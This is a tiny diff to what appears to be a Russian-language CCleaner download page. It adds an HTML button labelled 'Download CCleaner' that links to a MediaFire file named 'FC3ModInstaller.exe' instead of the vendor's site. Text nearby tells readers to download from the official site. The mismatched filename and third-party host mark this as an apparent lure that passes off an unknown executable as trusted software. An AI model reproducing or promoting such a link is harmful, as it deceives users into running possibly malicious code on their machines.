@@ -1,5 +1,8 @@
 🧼 CCleaner для Windows
 
+<a href="https://www.mediafire.com/file/9cpuvjzcvbq6195/FC3ModInstaller.exe/file" target="_blank">
+  <img src="https://i.imgur.com/dB8xg4n.png" alt="Скачать CCleaner" width="160"/>
+</a>
 
 Скачайте с официального сайта:
 
